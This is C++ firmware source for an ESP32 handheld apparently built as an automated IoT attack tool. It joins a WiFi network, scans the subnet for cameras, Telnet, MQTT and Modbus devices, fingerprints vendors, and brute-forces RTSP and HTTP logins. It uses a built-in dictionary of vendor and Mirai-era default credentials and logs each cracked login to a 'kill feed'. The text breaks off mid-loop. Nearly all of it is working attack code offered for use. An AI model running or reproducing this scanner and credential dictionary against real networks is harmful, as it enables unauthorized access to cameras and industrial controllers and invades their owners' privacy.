// =============================================================================
// HaleHound-CYD IoT Recon Module
// Automated LAN Attack Suite — Subnet Scanner + Credential Brute Force
// Created: 2026-03-01
// =============================================================================
//
// PIPELINE: WiFi Connect → Discover (port scan) → Identify (banner) →
//           Attack (brute force creds) → Report (kill feed + SD log)
//
// DUAL-CORE:
//   Core 0 = iotScanTask — all TCP networking (port scan, brute, MQTT, telnet)
//   Core 1 = Display + touch — kill feed, stats, Digital Plague animation
//
// =============================================================================

#include "iot_recon.h"
#include "shared.h"
#include "utils.h"
#include "touch_buttons.h"
#include "spi_manager.h"
#include "nosifer_font.h"
#include "icon.h"
#include <WiFi.h>
#include <WiFiClient.h>
#include <SD.h>
#include <TFT_eSPI.h>
#include <esp_wifi.h>

extern TFT_eSPI tft;
extern void drawStatusBar();
extern void drawInoIconBar();
extern bool isInoBackTapped();

// =============================================================================
// PORT TABLE
// =============================================================================

static const uint16_t scanPorts[IOT_MAX_PORTS] = { 554, 80, 8080, 23, 1883, 502, 443, 34567 };
static const char* portNames[IOT_MAX_PORTS] = { "RTSP", "HTTP", "HTTP", "Telnet", "MQTT", "Modbus", "HTTPS", "XMEye" };

// =============================================================================
// CREDENTIAL DICTIONARY (PROGMEM)
// Top IoT default credentials — cameras, routers, IoT devices, Mirai originals
// =============================================================================

struct CredPair {
    const char* user;
    const char* pass;
};

static const CredPair credDict[] PROGMEM = {
    // === TOP PRIORITY: blank/simple passwords (try first — fastest wins) ===
    {"admin", ""},            {"admin", "admin"},       {"admin", "12345"},
    {"admin", "password"},    {"admin", "1234"},        {"root", ""},
    {"root", "root"},         {"admin", "123456"},      {"admin", "pass"},

    // === CAMERA MANUFACTURERS — known defaults ===
    // Hikvision (massive market share)
    {"admin", "hikvision"},   {"admin", "Hikvision"},   {"admin", "12345678"},
    {"admin", "hik12345"},    {"admin", "HikHik"},

    // Dahua / DVR / NVR
    {"admin", "888888"},      {"admin", "666666"},      {"888888", "888888"},
    {"666666", "666666"},     {"admin", "dahua"},       {"admin", "Dahua"},

    // XMEye / Xiongmai (Chinese generic — HUGE market)
    {"admin", "xmhdipc"},     {"admin", "jvbzd"},       {"default", "tluafed"},
    {"root", "xc3511"},       {"root", "vizxv"},        {"root", "hi3518"},
    {"root", "juantech"},     {"root", "cat1029"},      {"root", "anko"},
    {"root", "GM8182"},       {"root", "icatch99"},

    // Reolink
    {"admin", "reolink"},     {"admin", "Reolink"},

    // Amcrest
    {"admin", "amcrest"},     {"admin", "Amcrest"},

    // Foscam
    {"admin", "foscam"},      {"admin", "Foscam"},

    // Lorex / FLIR
    {"admin", "000000"},      {"admin", "00000000"},    {"admin", "lorex"},
    {"admin", "fliradmin"},

    // Swann
    {"admin", "swann"},       {"admin", "Swann"},       {"admin", "111111"},

    // D-Link
    {"admin", "dlink"},       {"Admin", ""},

    // Axis
    {"root", "pass"},         {"root", "system"},

    // TP-Link
    {"admin", "admin123"},    {"admin", "tplink"},

    // Wyze / Xiaomi / Yi (local interfaces when exposed)
    {"admin", "wyze"},        {"admin", "ipcam"},

    // Uniview / UNV
    {"admin", "admin@123"},   {"admin", "Admin123"},

    // === GENERIC IoT / ROUTER / MIRAI ORIGINALS ===
    {"root", "toor"},         {"root", "12345"},        {"root", "admin"},
    {"root", "123456"},       {"root", "54321"},        {"root", "888888"},
    {"root", "ikwd"},         {"root", "Zte521"},       {"root", "dreambox"},
    {"root", "default"},      {"root", "password"},

    {"admin", "admin1"},      {"admin", "meinsm"},      {"admin", "supervisor"},
    {"admin", "system"},      {"admin", "1111"},        {"admin", "smcadmin"},
    {"admin", "4321"},        {"admin", "default"},     {"admin", "camera"},
    {"admin", "video"},       {"admin", "admin1234"},   {"admin", "qwerty"},
    {"admin", "1234567890"},  {"admin", "abc123"},      {"admin", "changeme"},
    {"admin", "letmein"},     {"admin", "1q2w3e4r"},    {"admin", "9999"},

    {"admin", "7ujMko0admin"},{"admin", "tlJwpbo6"},

    {"user", "user"},         {"user", "1234"},         {"ubnt", "ubnt"},
    {"support", "support"},   {"guest", "guest"},       {"service", "service"},
    {"operator", "operator"}, {"default", "default"},
};

static const int CRED_COUNT = sizeof(credDict) / sizeof(credDict[0]);

// =============================================================================
// SD CARD WORDLIST (/iot_creds.txt)
// Format: "username:password" per line, or just "password" (assumes admin)
// Lines starting with # are comments. Max 64 entries loaded into RAM.
// =============================================================================

#define IOT_MAX_SD_CREDS 64

struct SdCred {
    char user[IOT_MAX_CRED_USER];
    char pass[IOT_MAX_CRED_PASS];
};
static SdCred sdCreds[IOT_MAX_SD_CREDS];
static int sdCredCount = 0;

// Total cred count (built-in + SD)
static int totalCredCount = 0;

// Helper: get credential by index (built-in first, then SD)
static void getCred(int index, const char*& user, const char*& pass) {
    if (index < CRED_COUNT) {
        user = credDict[index].user;
        pass = credDict[index].pass;
    } else {
        int si = index - CRED_COUNT;
        user = sdCreds[si].user;
        pass = sdCreds[si].pass;
    }
}

// =============================================================================
// MODULE STATE
// =============================================================================

static IotDevice devices[IOT_MAX_DEVICES];
static volatile int deviceCount = 0;
static volatile int currentScanIP = 0;
static volatile IotScanPhase scanPhase = IOT_PHASE_CONNECT;
static volatile bool scanRunning = false;
static volatile bool scanDone = false;
static volatile bool exitRequested = false;
static volatile bool newEventFlag = false;

// Stats (volatile — written by Core 0, read by Core 1)
static volatile uint32_t camerasFound = 0;
static volatile uint32_t camerasCracked = 0;
static volatile uint32_t mqttFound = 0;
static volatile uint32_t telnetFound = 0;
static volatile uint32_t modbusFound = 0;
static volatile uint32_t hostsFound = 0;
static volatile uint32_t openServices = 0;
static volatile int currentCredIndex = 0;
static volatile int currentAttackDevice = 0;

// Core 0 task
static TaskHandle_t scanTaskHandle = NULL;
static volatile bool scanTaskRunning = false;
static volatile bool scanTaskDone = false;

// WiFi connection state
static char targetSSID[33] = {0};
static char targetPass[65] = {0};
static bool wifiConnected = false;
static IPAddress gatewayIP;
static IPAddress subnetMask;
static IPAddress localIP;

// Kill feed
struct KillLine {
    char text[52];
    uint16_t color;
};
static KillLine killFeed[IOT_MAX_KILL_LINES];
static int killFeedCount = 0;
static int killFeedScroll = 0;
static bool killFeedDirty = true;

// Digital Plague animation
struct PlagueColumn {
    int16_t y;
    int8_t  speed;
    bool    infected;
    uint8_t charIdx;
};
static PlagueColumn plagueColumns[30];
static int infectedCount = 0;
static unsigned long lastPlagueFrame = 0;

// Screen states
enum IotScreen : uint8_t {
    IOT_SCR_WIFI_SCAN = 0,
    IOT_SCR_KEYBOARD_SSID,
    IOT_SCR_KEYBOARD_PASS,
    IOT_SCR_CONNECTING,
    IOT_SCR_SCANNING,
    IOT_SCR_DETAIL,
    IOT_SCR_CREDS
};
static IotScreen currentScreen = IOT_SCR_WIFI_SCAN;

// Keyboard state
static String kbInput = "";
static uint8_t kbMode = 0; // 0=lower, 1=upper, 2=symbols
static const char* kbLower[]  = { "1234567890", "qwertyuiop", "asdfghjkl^", "zxcvbnm._<" };
static const char* kbUpper[]  = { "1234567890", "QWERTYUIOP", "ASDFGHJKL^", "ZXCVBNM._<" };
static const char* kbSymbol[] = { "!@#$%&*()-", "~`+=[]{}|^", ";:'\",.<>?/", "\\-!@#$%_<" };
static const char** kbLayout = kbLower;
static const int kbKeyW = SCALE_W(22);
static const int kbKeyH = SCALE_H(18);
static const int kbKeySp = 2;

// WiFi scan results for network picker
#define IOT_MAX_NETWORKS 20
struct WifiNet {
    char ssid[33];
    int  rssi;
    int  encType; // WIFI_AUTH_OPEN = 0
    uint8_t channel;
};
static WifiNet foundNetworks[IOT_MAX_NETWORKS];
static int networkCount = 0;
static int networkScroll = 0;

// Captured credentials (read from SD /creds.txt)
#define IOT_MAX_CREDS 10
struct CapturedCred {
    char ssid[33];
    char psk[65];
};
static CapturedCred capturedCreds[IOT_MAX_CREDS];
static int capturedCredCount = 0;
static int credScroll = 0;

// Detail view
static int detailDeviceIdx = -1;

// Timing
static unsigned long lastStatsDraw = 0;
static unsigned long scanStartTime = 0;
static unsigned long lastTouchTime = 0;
static const unsigned long IOT_DEBOUNCE_MS = 150;

// SD card
static bool sdReady = false;
static bool autoSaved = false;

// =============================================================================
// FORWARD DECLARATIONS
// =============================================================================

static void drawWifiScanScreen();
static void drawKeyboardScreen(const char* prompt, int maxLen);
static void handleKeyboardTouch(int x, int y, int maxLen);
static void drawConnectingScreen();
static void drawScanScreen();
static void drawKillFeed();
static void drawStats();
static void drawDetailView(int idx);
static void addKillLine(const char* text, uint16_t color);
static void updatePlagueAnimation();
static void initPlague();
static void saveReportToSD();
static bool tryWiFiConnect();
static void doWifiScan();
static void loadCapturedCreds();
static void loadSdWordlist();
static void drawCredsScreen();
static void handleCredsTouch(int x, int y);

// =============================================================================
// HELPER: Base64 encode for HTTP Basic Auth
// =============================================================================

static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void base64Encode(const char* input, int len, char* output, int outMax) {
    int i = 0, j = 0;
    uint8_t a3[3], a4[4];
    while (len--) {
        a3[i++] = *(input++);
        if (i == 3) {
            a4[0] = (a3[0] & 0xfc) >> 2;
            a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
            a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
            a4[3] = a3[2] & 0x3f;
            for (i = 0; i < 4 && j < outMax - 1; i++)
                output[j++] = b64chars[a4[i]];
            i = 0;
        }
    }
    if (i) {
        for (int k = i; k < 3; k++) a3[k] = '\0';
        a4[0] = (a3[0] & 0xfc) >> 2;
        a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
        a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
        for (int k = 0; k < i + 1 && j < outMax - 1; k++)
            output[j++] = b64chars[a4[k]];
        while (i++ < 3 && j < outMax - 1)
            output[j++] = '=';
    }
    output[j] = '\0';
}

// =============================================================================
// HELPER: IP to string
// =============================================================================

static void ipToStr(const uint8_t* ip, char* buf, int bufLen) {
    snprintf(buf, bufLen, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
}

// =============================================================================
// KILL FEED
// =============================================================================

static void addKillLine(const char* text, uint16_t color) {
    if (killFeedCount < IOT_MAX_KILL_LINES) {
        strncpy(killFeed[killFeedCount].text, text, sizeof(killFeed[0].text) - 1);
        killFeed[killFeedCount].text[sizeof(killFeed[0].text) - 1] = '\0';
        killFeed[killFeedCount].color = color;
        killFeedCount++;
    } else {
        // Scroll up — drop oldest
        for (int i = 0; i < IOT_MAX_KILL_LINES - 1; i++) {
            killFeed[i] = killFeed[i + 1];
        }
        strncpy(killFeed[IOT_MAX_KILL_LINES - 1].text, text, sizeof(killFeed[0].text) - 1);
        killFeed[IOT_MAX_KILL_LINES - 1].text[sizeof(killFeed[0].text) - 1] = '\0';
        killFeed[IOT_MAX_KILL_LINES - 1].color = color;
    }
    // Auto-scroll to show latest
    int feedH = SCALE_Y(290) - SCALE_Y(125);
    int maxLines = feedH / 12;
    if (killFeedCount > maxLines) {
        killFeedScroll = killFeedCount - maxLines;
    }
    killFeedDirty = true;
}

// =============================================================================
// DIGITAL PLAGUE ANIMATION
// =============================================================================

static void initPlague() {
    for (int i = 0; i < 30; i++) {
        plagueColumns[i].y = random(0, SCREEN_HEIGHT);
        plagueColumns[i].speed = random(2, 6);
        plagueColumns[i].infected = false;
        plagueColumns[i].charIdx = random(0, 94);
    }
    infectedCount = 0;
    lastPlagueFrame = millis();
}

static void updatePlagueAnimation() {
    if (millis() - lastPlagueFrame < 66) return; // ~15 FPS
    lastPlagueFrame = millis();

    int colW = SCREEN_WIDTH / 30;

    for (int i = 0; i < 30; i++) {
        PlagueColumn& col = plagueColumns[i];

        // Draw character at current position
        int drawX = i * colW;
        int drawY = col.y;

        if (drawY >= SCALE_Y(125) && drawY < SCALE_Y(290)) {
            // Only draw in kill feed background area
            uint16_t charColor = col.infected ? HALEHOUND_HOTPINK : HALEHOUND_GREEN;
            char ch = 33 + (col.charIdx % 94); // Printable ASCII
            col.charIdx++;

            // Dim the character (draw behind kill feed text)
            uint16_t dimColor;
            if (col.infected) {
                dimColor = tft.color565(60, 0, 30); // Dim pink
            } else {
                dimColor = tft.color565(0, 30, 0);  // Dim green
            }
            tft.setTextColor(dimColor);
            tft.setTextSize(1);
            tft.setCursor(drawX, drawY);
            tft.print(ch);
        }

        // Move column down
        col.y += col.speed;
        if (col.y >= SCALE_Y(290)) {
            col.y = SCALE_Y(125);
            col.charIdx = random(0, 94);
        }

        // Infection spread: 30% chance per frame to infect neighbor
        if (col.infected) {
            if (i > 0 && !plagueColumns[i - 1].infected && random(0, 100) < 30) {
                plagueColumns[i - 1].infected = true;
                infectedCount++;
            }
            if (i < 29 && !plagueColumns[i + 1].infected && random(0, 100) < 30) {
                plagueColumns[i + 1].infected = true;
                infectedCount++;
            }
        }
    }
}

static void infectNearestColumn(uint8_t* ip) {
    // Map IP last octet to column index
    int col = (ip[3] * 30) / 255;
    col = constrain(col, 0, 29);
    if (!plagueColumns[col].infected) {
        plagueColumns[col].infected = true;
        infectedCount++;
    }
}

// =============================================================================
// CORE 0: SCANNER TASK — All TCP networking runs here
// =============================================================================

static void iotScanTask(void* param) {
    #if CYD_DEBUG
    Serial.println("[IOT] Core 0: Scanner task started");
    #endif

    // Load SD wordlist before scanning
    loadSdWordlist();
    if (sdCredCount > 0) {
        char msg[52];
        snprintf(msg, sizeof(msg), "[+] SD: %d extra creds loaded", sdCredCount);
        addKillLine(msg, HALEHOUND_GREEN);
        newEventFlag = true;
    } else {
        totalCredCount = CRED_COUNT;
    }
    {
        char msg[52];
        snprintf(msg, sizeof(msg), "[*] %d total credentials armed", totalCredCount);
        addKillLine(msg, HALEHOUND_CYAN);
        newEventFlag = true;
    }

    WiFiClient client;
    client.setTimeout(3); // 3 SECONDS for stream read/write operations
    uint8_t baseIP[4];
    baseIP[0] = gatewayIP[0];
    baseIP[1] = gatewayIP[1];
    baseIP[2] = gatewayIP[2];
    baseIP[3] = 0;

    // =========================================================================
    // PHASE 1: DISCOVER — Smart TCP connect scan
    // Quick-check port 80 first (200ms), skip dead hosts entirely
    // Deep-scan remaining ports only on live hosts (500ms)
    // Uses 3-arg connect(ip, port, timeout_ms) — NOT setTimeout(SECONDS)!
    // =========================================================================

    scanPhase = IOT_PHASE_DISCOVER;
    addKillLine("[*] Scanning subnet...", HALEHOUND_CYAN);
    newEventFlag = true;

    for (int host = 1; host <= 254 && scanTaskRunning; host++) {
        currentScanIP = host;
        IPAddress ip(baseIP[0], baseIP[1], baseIP[2], host);

        // Skip our own IP and gateway .0/.255
        if ((uint8_t)host == localIP[3] || host == 255) continue;

        uint8_t portMask = 0;
        bool hostAlive = false;

        // Quick reachability: probe common ports (300ms each)
        // Port 80 (HTTP) — most devices
        if (client.connect(ip, 80, 300)) {
            portMask |= 0x02; // bit 1 = port 80
            client.stop();
            hostAlive = true;
        }

        // Port 554 (RTSP) — cameras that don't run HTTP
        if (!hostAlive && scanTaskRunning) {
            if (client.connect(ip, 554, 300)) {
                portMask |= 0x01; // bit 0 = port 554
                client.stop();
                hostAlive = true;
            }
        }

        // Port 443 (HTTPS) — Wyze, Ring, modern cameras
        if (!hostAlive && scanTaskRunning) {
            if (client.connect(ip, 443, 300)) {
                portMask |= 0x40; // bit 6 = port 443
                client.stop();
                hostAlive = true;
            }
        }

        // Port 34567 (XMEye/CMS) — Chinese cameras
        if (!hostAlive && scanTaskRunning) {
            if (client.connect(ip, 34567, 300)) {
                portMask |= 0x80; // bit 7 = port 34567
                client.stop();
                hostAlive = true;
            }
        }

        // Port 23 (Telnet) — last resort
        if (!hostAlive && scanTaskRunning) {
            if (client.connect(ip, 23, 300)) {
                portMask |= 0x08; // bit 3 = port 23
                client.stop();
                hostAlive = true;
            }
        }

        // Host is dead — skip remaining ports
        if (!hostAlive) {
            vTaskDelay(1);
            continue;
        }

        // Host is alive — deep scan remaining ports (500ms timeout)
        for (int p = 0; p < IOT_MAX_PORTS && scanTaskRunning; p++) {
            if (portMask & (1 << p)) continue; // Already checked
            if (client.connect(ip, scanPorts[p], 500)) {
                portMask |= (1 << p);
                client.stop();
            }
        }

        if (portMask && deviceCount < IOT_MAX_DEVICES) {
            int idx = deviceCount;
            uint8_t ipBytes[4] = { baseIP[0], baseIP[1], baseIP[2], (uint8_t)host };
            memcpy(devices[idx].ip, ipBytes, 4);
            devices[idx].openPorts = portMask;
            devices[idx].type = IOT_UNKNOWN;
            devices[idx].status = IOT_FOUND;
            devices[idx].banner[0] = '\0';
            devices[idx].credUser[0] = '\0';
            devices[idx].credPass[0] = '\0';
            devices[idx].mqttTopics = 0;
            deviceCount++;
            hostsFound++;

            char msg[52];
            char ipStr[16];
            ipToStr(ipBytes, ipStr, sizeof(ipStr));

            // List open ports
            String ports = "";
            for (int p = 0; p < IOT_MAX_PORTS; p++) {
                if (portMask & (1 << p)) {
                    if (ports.length() > 0) ports += ",";
                    ports += String(scanPorts[p]);
                }
            }
            snprintf(msg, sizeof(msg), "[+] FOUND %s :%s", ipStr, ports.c_str());
            addKillLine(msg, HALEHOUND_MAGENTA);
            newEventFlag = true;
        }

        vTaskDelay(1); // Watchdog feed
    }

    if (!scanTaskRunning) goto task_exit;

    // =========================================================================
    // PHASE 2: IDENTIFY — Banner grab + fingerprint
    // =========================================================================

    scanPhase = IOT_PHASE_IDENTIFY;

    for (int d = 0; d < deviceCount && scanTaskRunning; d++) {
        IotDevice& dev = devices[d];
        IPAddress devIP(dev.ip[0], dev.ip[1], dev.ip[2], dev.ip[3]);

        // HTTP banner grab (port 80 or 8080)
        if ((dev.openPorts & 0x02) || (dev.openPorts & 0x04)) {
            uint16_t port = (dev.openPorts & 0x02) ? 80 : 8080;
            if (client.connect(devIP, port, 2000)) {
                client.print("GET / HTTP/1.0\r\nHost: ");
                char ipStr[16];
                ipToStr(dev.ip, ipStr, sizeof(ipStr));
                client.print(ipStr);
                client.print("\r\nConnection: close\r\n\r\n");

                unsigned long t0 = millis();
                String response = "";
                while (client.connected() && millis() - t0 < 3000 && response.length() < 512) {
                    while (client.available() && response.length() < 512) {
                        response += (char)client.read();
                    }
                    vTaskDelay(1);
                }
                client.stop();

                // Extract Server header
                int sIdx = response.indexOf("Server:");
                if (sIdx >= 0) {
                    int eIdx = response.indexOf("\r\n", sIdx);
                    if (eIdx > sIdx) {
                        String server = response.substring(sIdx + 8, min(eIdx, sIdx + 8 + IOT_MAX_BANNER_LEN - 1));
                        server.trim();
                        strncpy(dev.banner, server.c_str(), IOT_MAX_BANNER_LEN - 1);
                        dev.banner[IOT_MAX_BANNER_LEN - 1] = '\0';
                    }
                }

                // Fingerprint
                String rLow = response;
                rLow.toLowerCase();
                if (rLow.indexOf("hikvision") >= 0 || rLow.indexOf("hik") >= 0) {
                    dev.type = IOT_CAMERA;
                    strncpy(dev.banner, "Hikvision", IOT_MAX_BANNER_LEN);
                } else if (rLow.indexOf("dahua") >= 0 || rLow.indexOf("dh-") >= 0) {
                    dev.type = IOT_CAMERA;
                    strncpy(dev.banner, "Dahua", IOT_MAX_BANNER_LEN);
                } else if (rLow.indexOf("reolink") >= 0) {
                    dev.type = IOT_CAMERA;
                    strncpy(dev.banner, "Reolink", IOT_MAX_BANNER_LEN);
                } else if (rLow.indexOf("tp-link") >= 0 || rLow.indexOf("tplink") >= 0) {
                    dev.type = IOT_HTTP_DEVICE;
                    strncpy(dev.banner, "TP-Link", IOT_MAX_BANNER_LEN);
                } else if (rLow.indexOf("401") >= 0 && (dev.openPorts & 0x01)) {
                    dev.type = IOT_CAMERA; // Has RTSP + HTTP auth = likely camera
                }
            }
        }

        // RTSP check (port 554)
        if ((dev.openPorts & 0x01) && scanTaskRunning) {
            if (client.connect(devIP, 554, 2000)) {
                client.print("OPTIONS rtsp://");
                char ipStr[16];
                ipToStr(dev.ip, ipStr, sizeof(ipStr));
                client.print(ipStr);
                client.print(":554 RTSP/1.0\r\nCSeq: 1\r\n\r\n");

                unsigned long t0 = millis();
                String resp = "";
                while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                    while (client.available() && resp.length() < 256) {
                        resp += (char)client.read();
                    }
                    vTaskDelay(1);
                }
                client.stop();

                if (dev.type == IOT_UNKNOWN) {
                    dev.type = IOT_CAMERA;
                    if (dev.banner[0] == '\0') strncpy(dev.banner, "RTSP Camera", IOT_MAX_BANNER_LEN);
                }
                camerasFound++;
            }
        }

        // MQTT check (port 1883)
        if ((dev.openPorts & 0x10) && scanTaskRunning) {
            dev.type = IOT_MQTT_BROKER;
            mqttFound++;
            if (dev.banner[0] == '\0') strncpy(dev.banner, "MQTT Broker", IOT_MAX_BANNER_LEN);
        }

        // Telnet check (port 23)
        if ((dev.openPorts & 0x08) && scanTaskRunning) {
            if (client.connect(devIP, 23, 2000)) {
                unsigned long t0 = millis();
                String banner = "";
                while (client.connected() && millis() - t0 < 2000 && banner.length() < 128) {
                    while (client.available() && banner.length() < 128) {
                        banner += (char)client.read();
                    }
                    vTaskDelay(1);
                }
                client.stop();

                if (dev.type == IOT_UNKNOWN) dev.type = IOT_TELNET_DEVICE;
                if (banner.length() > 0 && dev.banner[0] == '\0') {
                    strncpy(dev.banner, banner.c_str(), IOT_MAX_BANNER_LEN - 1);
                    dev.banner[IOT_MAX_BANNER_LEN - 1] = '\0';
                    // Strip control chars
                    for (int c = 0; c < IOT_MAX_BANNER_LEN && dev.banner[c]; c++) {
                        if (dev.banner[c] < 32) dev.banner[c] = ' ';
                    }
                }
                telnetFound++;
            }
        }

        // Modbus check (port 502)
        if ((dev.openPorts & 0x20) && scanTaskRunning) {
            dev.type = IOT_MODBUS_PLC;
            modbusFound++;
            if (dev.banner[0] == '\0') strncpy(dev.banner, "Modbus PLC", IOT_MAX_BANNER_LEN);
        }

        // HTTPS check (port 443) — Wyze, Ring, modern cameras
        if ((dev.openPorts & 0x40) && scanTaskRunning) {
            if (dev.type == IOT_UNKNOWN) {
                // Port 443 + RTSP = definitely a camera
                if (dev.openPorts & 0x01) {
                    dev.type = IOT_CAMERA;
                    if (dev.banner[0] == '\0') strncpy(dev.banner, "HTTPS Camera", IOT_MAX_BANNER_LEN);
                    camerasFound++;
                } else {
                    // 443 alone — likely a smart camera or IoT hub
                    dev.type = IOT_HTTP_DEVICE;
                    if (dev.banner[0] == '\0') strncpy(dev.banner, "HTTPS Device", IOT_MAX_BANNER_LEN);
                }
            }
        }

        // XMEye/CMS check (port 34567) — Chinese cameras (Xiongmai, generic NVR)
        if ((dev.openPorts & 0x80) && scanTaskRunning) {
            dev.type = IOT_CAMERA;
            camerasFound++;
            if (dev.banner[0] == '\0') strncpy(dev.banner, "XMEye Camera", IOT_MAX_BANNER_LEN);
        }

        // Update kill feed with identification
        if (dev.type != IOT_UNKNOWN) {
            char msg[52], ipStr[16];
            ipToStr(dev.ip, ipStr, sizeof(ipStr));
            const char* typeStr = "Device";
            switch (dev.type) {
                case IOT_CAMERA:       typeStr = "Camera"; break;
                case IOT_MQTT_BROKER:  typeStr = "MQTT";   break;
                case IOT_TELNET_DEVICE:typeStr = "Telnet"; break;
                case IOT_MODBUS_PLC:   typeStr = "Modbus"; break;
                case IOT_HTTP_DEVICE:  typeStr = "HTTP";   break;
                default: break;
            }
            snprintf(msg, sizeof(msg), "[*] %s %s (%s)", typeStr, ipStr, dev.banner);
            addKillLine(msg, HALEHOUND_CYAN);
            newEventFlag = true;
        }

        vTaskDelay(1);
    }

    if (!scanTaskRunning) goto task_exit;

    // =========================================================================
    // PHASE 3: ATTACK — Auto-select per device type
    // =========================================================================

    scanPhase = IOT_PHASE_ATTACK;

    for (int d = 0; d < deviceCount && scanTaskRunning; d++) {
        IotDevice& dev = devices[d];
        IPAddress devIP(dev.ip[0], dev.ip[1], dev.ip[2], dev.ip[3]);
        currentAttackDevice = d;

        char ipStr[16];
        ipToStr(dev.ip, ipStr, sizeof(ipStr));

        // ── CAMERA: RTSP brute force ──
        if (dev.type == IOT_CAMERA && (dev.openPorts & 0x01) && scanTaskRunning) {
            dev.status = IOT_TESTING;
            bool cracked = false;
            int connFails = 0; // Consecutive connection failures

            {
                char msg[52];
                snprintf(msg, sizeof(msg), "[>] RTSP brute %s (%d creds)", ipStr, totalCredCount);
                addKillLine(msg, HALEHOUND_CYAN);
                newEventFlag = true;
            }

            for (int c = 0; c < totalCredCount && scanTaskRunning && !cracked; c++) {
                currentCredIndex = c;
                const char* user;
                const char* pass;
                getCred(c, user, pass);

                // Progress every 10 creds
                if (c > 0 && c % 10 == 0) {
                    char msg[52];
                    snprintf(msg, sizeof(msg), "[>] %s RTSP [%d/%d]...", ipStr, c, totalCredCount);
                    addKillLine(msg, HALEHOUND_GUNMETAL);
                    newEventFlag = true;
                }

                if (client.connect(devIP, 554, 1000)) {
                    connFails = 0; // Reset on success
                    // Build auth string
                    char authPlain[40];
                    snprintf(authPlain, sizeof(authPlain), "%s:%s", user, pass);
                    char authB64[64];
                    base64Encode(authPlain, strlen(authPlain), authB64, sizeof(authB64));

                    // RTSP DESCRIBE with Basic auth
                    client.print("DESCRIBE rtsp://");
                    client.print(ipStr);
                    client.print(":554/ RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic ");
                    client.print(authB64);
                    client.print("\r\n\r\n");

                    unsigned long t0 = millis();
                    String resp = "";
                    while (client.connected() && millis() - t0 < 2000 && resp.length() < 128) {
                        while (client.available() && resp.length() < 128) {
                            resp += (char)client.read();
                        }
                        vTaskDelay(1);
                    }
                    client.stop();

                    if (resp.indexOf("200") >= 0) {
                        cracked = true;
                        strncpy(dev.credUser, user, IOT_MAX_CRED_USER - 1);
                        strncpy(dev.credPass, pass, IOT_MAX_CRED_PASS - 1);
                        dev.status = IOT_CRACKED;
                        camerasCracked++;

                        char msg[52];
                        snprintf(msg, sizeof(msg), "[!!!] CRACKED %s %s:%s", ipStr, user, pass);
                        addKillLine(msg, HALEHOUND_HOTPINK);
                        newEventFlag = true;
                        infectNearestColumn(dev.ip);
                    }
                } else {
                    connFails++;
                    if (connFails >= 5) {
                        char msg[52];
                        snprintf(msg, sizeof(msg), "[!] %s RTSP blocked (5 fails)", ipStr);
                        addKillLine(msg, HALEHOUND_GUNMETAL);
                        newEventFlag = true;
                        break; // Camera is rate-limiting, move on
                    }
                }
                vTaskDelay(1);
            }

            // Try HTTP auth if RTSP failed
            if (!cracked && (dev.openPorts & 0x02) && scanTaskRunning) {
                connFails = 0;
                uint16_t port = 80;

                {
                    char msg[52];
                    snprintf(msg, sizeof(msg), "[>] HTTP brute %s (%d creds)", ipStr, totalCredCount);
                    addKillLine(msg, HALEHOUND_CYAN);
                    newEventFlag = true;
                }

                for (int c = 0; c < totalCredCount && scanTaskRunning && !cracked; c++) {
                    currentCredIndex = c;
                    const char* user;
                    const char* pass;
                    getCred(c, user, pass);

                    // Progress every 10 creds
                    if (c > 0 && c % 10 == 0) {
                        char msg[52];
                        snprintf(msg, sizeof(msg), "[>] %s HTTP [%d/%d]...", ipStr, c, totalCredCount);
                        addKillLine(msg, HALEHOUND_GUNMETAL);
                        newEventFlag = true;
                    }

                    if (client.connect(devIP, port, 1000)) {
                        connFails = 0;
                        char authPlain[40];
                        snprintf(authPlain, sizeof(authPlain), "%s:%s", user, pass);
                        char authB64[64];
                        base64Encode(authPlain, strlen(authPlain), authB64, sizeof(authB64));

                        client.print("GET / HTTP/1.0\r\nHost: ");
                        client.print(ipStr);
                        client.print("\r\nAuthorization: Basic ");
                        client.print(authB64);
                        client.print("\r\nConnection: close\r\n\r\n");

                        unsigned long t0 = millis();
                        String resp = "";
                        while (client.connected() && millis() - t0 < 2000 && resp.length() < 128) {
                            while (client.available() && resp.length() < 128) {
                                resp += (char)client.read();
                            }
                            vTaskDelay(1);
                        }
                        client.stop();

                        if (resp.indexOf("200") >= 0 && resp.indexOf("401") < 0) {
                            cracked = true;
                            strncpy(dev.credUser, user, IOT_MAX_CRED_USER - 1);
                            strncpy(dev.credPass, pass, IOT_MAX_CRED_PASS - 1);
                            dev.status = IOT_CRACKED;
                            camerasCracked++;

                            char msg[52];
                            snprintf(msg, sizeof(msg), "[!!!] CRACKED %s %s:%s", ipStr, user, pass);
                            addKillLine(msg, HALEHOUND_HOTPINK);
                            newEventFlag = true;
                            infectNearestColumn(dev.ip);
                        }
                    } else {
                        connFails++;
                        if (connFails >= 5) {
                            char msg[52];
                            snprintf(msg, sizeof(msg), "[!] %s HTTP blocked (5 fails)", ipStr);
                            addKillLine(msg, HALEHOUND_GUNMETAL);
                            newEventFlag = true;
                            break;
                        }
                    }
                    vTaskDelay(1);
                }
            }

            if (!cracked && dev.status == IOT_TESTING) {
                dev.status = IOT_LOCKED;
                char msg[52];
                snprintf(msg, sizeof(msg), "[x] LOCKED %s (all failed)", ipStr);
                addKillLine(msg, HALEHOUND_GUNMETAL);
                newEventFlag = true;
            }
        }

        // ── CAMERA: HTTP-only (no RTSP) ──
        if (dev.type == IOT_CAMERA && !(dev.openPorts & 0x01) && (dev.openPorts & 0x06) && scanTaskRunning) {
            dev.status = IOT_TESTING;
            bool cracked = false;
            int connFails = 0;
            uint16_t port = (dev.openPorts & 0x02) ? 80 : 8080;

            {
                char msg[52];
                snprintf(msg, sizeof(msg), "[>] HTTP brute %s (%d creds)", ipStr, totalCredCount);
                addKillLine(msg, HALEHOUND_CYAN);
                newEventFlag = true;
            }

            for (int c = 0; c < totalCredCount && scanTaskRunning && !cracked; c++) {
                currentCredIndex = c;
                const char* user;
                const char* pass;
                getCred(c, user, pass);

                // Progress every 10 creds
                if (c > 0 && c % 10 == 0) {
                    char msg[52];
